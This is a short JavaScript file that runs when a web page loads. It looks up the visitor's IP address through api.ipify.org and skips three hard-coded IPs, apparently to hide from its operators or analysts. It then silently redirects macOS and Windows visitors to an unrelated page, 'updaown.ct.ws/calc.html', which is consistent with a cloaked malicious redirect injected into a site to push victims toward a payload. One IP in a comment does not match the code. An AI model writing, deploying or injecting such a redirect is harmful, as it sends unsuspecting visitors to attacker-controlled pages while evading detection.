document.addEventListener('DOMContentLoaded', async function () {
    const userAgent = navigator.userAgent.toLowerCase();

    try {
        // Fetch the user's IP address
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const userIP = data.ip;

       // If the IP is 135.135.191.70, 174.192.133.153, or 198.182.179.54, do nothing
if (userIP === '135.135.191.70' || userIP === '174.192.133.153' || userIP === '198.182.179.95') {
    return;
}

        // Check if the OS is macOS or Windows
        if (userAgent.includes('macintosh') || userAgent.includes('windows')) {
            window.location.href = 'https://updaown.ct.ws/calc.html';
        }
        // If the OS is not macOS or Windows, do nothing
    } catch (error) {
        console.error('Error fetching IP:', error);
    }
});
